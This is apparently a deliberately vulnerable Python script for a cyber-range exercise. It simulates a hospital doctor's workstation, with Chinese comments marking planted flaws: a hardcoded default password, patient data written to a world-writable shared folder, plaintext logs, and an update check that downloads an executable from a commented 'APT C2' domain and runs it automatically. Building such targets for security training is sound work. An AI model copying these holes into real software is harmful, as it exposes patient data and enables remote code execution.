#!/usr/bin/env python3
"""
医疗工作站客户端 - 模拟医疗工作站的日常操作
包含预设漏洞，可能被APT攻击利用
"""

import requests
import json
import time
import os
import subprocess
import random

class MedicalWorkstation:
    def __init__(self):
        self.role = os.getenv('USER_ROLE', 'doctor')
        self.username = os.getenv('USERNAME', 'dr_zhang')
        self.department = os.getenv('DEPARTMENT', 'internal_medicine')
        self.his_url = "http://his-server"
        self.pacs_url = "http://pacs-server"
        self.session = requests.Session()
        
    def login_to_his(self):
        """登录HIS系统"""
        try:
            login_data = {
                'username': self.username,
                'password': os.getenv('PASSWORD', 'Doctor123!')
            }
            response = self.session.post(f"{self.his_url}/login", data=login_data)
            if response.status_code == 200:
                print(f"[{self.username}] Successfully logged into HIS system")
                return True
            else:
                print(f"[{self.username}] Failed to login to HIS system")
                return False
        except Exception as e:
            print(f"[{self.username}] HIS login error: {e}")
            return False
    
    def access_patient_records(self):
        """访问患者记录"""
        try:
            # 模拟访问患者数据
            patients = ['张三', '李四', '王五', '赵六']
            patient = random.choice(patients)
            
            # 预设漏洞：使用GET请求传递敏感参数
            response = self.session.get(f"{self.his_url}/patients?search={patient}")
            
            if response.status_code == 200:
                print(f"[{self.username}] Accessed patient records for: {patient}")
                
                # 模拟下载患者数据到本地（预设漏洞：敏感数据本地存储）
                patient_data = {
                    'patient_name': patient,
                    'id_card': f'11010119900101{random.randint(1000, 9999)}',
                    'medical_history': 'Confidential medical information',
                    'access_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'accessed_by': self.username
                }
                
                # 保存到共享文件夹（预设漏洞：敏感数据存储在不安全位置）
                with open(f'/shared/patient_data/{patient}_record.json', 'w') as f:
                    json.dump(patient_data, f, ensure_ascii=False, indent=2)
                
                return True
            else:
                print(f"[{self.username}] Failed to access patient records")
                return False
                
        except Exception as e:
            print(f"[{self.username}] Patient record access error: {e}")
            return False
    
    def download_medical_images(self):
        """下载医学影像"""
        try:
            # 模拟从PACS系统下载医学影像
            image_types = ['CT', 'MRI', 'X-Ray', 'Ultrasound']
            image_type = random.choice(image_types)
            
            print(f"[{self.username}] Downloading {image_type} images from PACS")
            
            # 模拟下载大文件
            time.sleep(2)
            
            # 创建模拟影像文件（预设漏洞：文件权限不当）
            image_file = f'/shared/patient_data/{image_type}_image_{random.randint(1000, 9999)}.dcm'
            with open(image_file, 'w') as f:
                f.write(f"DICOM Image Data - {image_type}\n")
                f.write(f"Patient: Confidential\n")
                f.write(f"Downloaded by: {self.username}\n")
                f.write(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            
            # 设置不安全的文件权限
            os.chmod(image_file, 0o666)
            
            print(f"[{self.username}] Downloaded image saved to: {image_file}")
            return True
            
        except Exception as e:
            print(f"[{self.username}] Image download error: {e}")
            return False
    
    def send_email(self):
        """发送邮件（模拟）"""
        try:
            # 模拟发送医疗相关邮件
            recipients = ['colleague@hospital.com', 'admin@hospital.com']
            recipient = random.choice(recipients)
            
            email_content = {
                'from': os.getenv('EMAIL', 'zhang.doctor@hospital.com'),
                'to': recipient,
                'subject': f'Patient consultation - {random.choice(["张三", "李四", "王五"])}',
                'body': 'Please review the attached patient records...',
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }
            
            print(f"[{self.username}] Sent email to: {recipient}")
            
            # 保存邮件记录（预设漏洞：邮件内容明文存储）
            with open('/shared/patient_data/email_log.txt', 'a') as f:
                f.write(f"{json.dumps(email_content, ensure_ascii=False)}\n")
            
            return True
            
        except Exception as e:
            print(f"[{self.username}] Email sending error: {e}")
            return False
    
    def check_system_updates(self):
        """检查系统更新（预设漏洞：容易被钓鱼攻击利用）"""
        try:
            # 模拟检查系统更新
            update_servers = [
                'http://medical-updates.com',  # APT C2服务器伪装
                'http://software-updates.net',
                'http://hospital-updates.org'
            ]
            
            for server in update_servers:
                try:
                    print(f"[{self.username}] Checking updates from: {server}")
                    response = requests.get(f"{server}/", timeout=5)
                    
                    if response.status_code == 200:
                        print(f"[{self.username}] Update server responded: {server}")
                        
                        # 预设漏洞：自动下载"更新"文件
                        if 'medical-updates.com' in server:
                            print(f"[{self.username}] Downloading critical security update...")
                            update_response = requests.get(f"{server}/download/his_update.exe")
                            
                            if update_response.status_code == 200:
                                # 保存"更新"文件（实际上是恶意载荷）
                                with open('/tmp/his_update.exe', 'wb') as f:
                                    f.write(update_response.content)
                                
                                print(f"[{self.username}] Update downloaded to /tmp/his_update.exe")
                                
                                # 预设漏洞：自动执行下载的文件
                                print(f"[{self.username}] Installing update...")
                                subprocess.run(['python3', '/tmp/his_update.exe'], capture_output=True)
                    
                except requests.exceptions.RequestException:
                    print(f"[{self.username}] Could not reach update server: {server}")
                    continue
            
            return True
            
        except Exception as e:
            print(f"[{self.username}] Update check error: {e}")
            return False
    
    def simulate_daily_work(self):
        """模拟日常工作"""
        print(f"[{self.username}] Starting daily work simulation - Role: {self.role}")
        
        # 登录HIS系统
        if self.login_to_his():
            
            # 模拟工作流程
            activities = [
                self.access_patient_records,
                self.download_medical_images,
                self.send_email,
                self.check_system_updates
            ]
            
            for activity in activities:
                try:
                    activity()
                    time.sleep(random.randint(30, 120))  # 随机等待30-120秒
                except Exception as e:
                    print(f"[{self.username}] Activity error: {e}")
                    continue
        
        print(f"[{self.username}] Daily work simulation completed")

if __name__ == '__main__':
    workstation = MedicalWorkstation()
    
    # 持续模拟工作
    while True:
        try:
            workstation.simulate_daily_work()
            # 等待一段时间后重复
            time.sleep(random.randint(300, 600))  # 5-10分钟
        except KeyboardInterrupt:
            print("Workstation simulation stopped")
            break
        except Exception as e:
            print(f"Simulation error: {e}")
            time.sleep(60)  # 出错后等待1分钟再重试
